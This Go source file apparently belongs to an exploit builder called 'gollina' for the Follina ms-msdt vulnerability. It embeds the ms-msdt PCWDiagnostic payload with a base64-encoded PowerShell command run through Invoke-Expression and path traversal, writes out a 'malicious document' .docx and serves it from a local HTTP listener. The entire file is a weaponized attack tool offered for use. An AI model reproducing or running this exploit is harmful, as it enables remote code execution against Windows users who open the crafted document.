package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"io/fs"
	"io/ioutil"
	"path/filepath"
)

func init() {
	opt = &options{}

	flag.StringVar(&opt.host, "h", "0.0.0.0", "")
	flag.StringVar(&opt.host, "host", "0.0.0.0", "")

	flag.IntVar(&opt.port, "p", 8090, "")
	flag.IntVar(&opt.port, "port", 8090, "")

	flag.StringVar(&opt.command, "c", "", "")
	flag.StringVar(&opt.command, "command", "", "")

	flag.StringVar(&opt.name, "n", "gollina", "")
	flag.StringVar(&opt.name, "name", "gollina", "")

	flag.Usage = func() {
		fmt.Fprint(os.Stderr, header+usage+opts+examples)
	}
	flag.Parse()

	if opt.command != "" {
		opt.command = strings.Replace(opt.command, `"`, `\"`, -1)
	} else {
		flag.Usage()
		os.Exit(2)
	}

	fmt.Fprint(os.Stderr, header)

	opt.tmp, _ = ioutil.TempDir("", "gollina-")
	opt.payload = `ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'%s'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"`
}

func main() {
	log.Println("Generate payloads...")
	opt.command, _ = powershellEncode(opt.command)
	opt.payload = fmt.Sprintf(opt.payload, opt.command)
	opt.payload = fmt.Sprintf("%q", opt.payload)

	fsys := os.DirFS("res")
	if err := fs.WalkDir(fsys, ".", opt.walkDir); err != nil {
		log.Fatal(err)
	}

	log.Println("Generate malicious document...")
	cwd, _ := os.Getwd()
	out := filepath.Join(cwd, fmt.Sprint(opt.name, ".", "docx"))

	if err := os.Chdir(filepath.Join(opt.tmp, "src", opt.name)); err != nil {
		log.Fatal(err)
	}

	if err := zipSource(".", out); err != nil {
		log.Fatal(err)
	}

	loc, err := filepath.Abs(out)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Document file location:", loc)

	if err := os.Chdir(cwd); err != nil {
		log.Fatal(err)
	}

	os.RemoveAll(opt.tmp)
	opt.serve()
}

func (opt *options) walkDir(path string, d fs.DirEntry, err error) error {
	if err != nil {
		log.Fatal(err)
	}

	if !shouldSkip(path) {
		err = opt.compile(path, d)
		if err != nil {
			log.Fatal(err)
		}
	}

	return nil
}
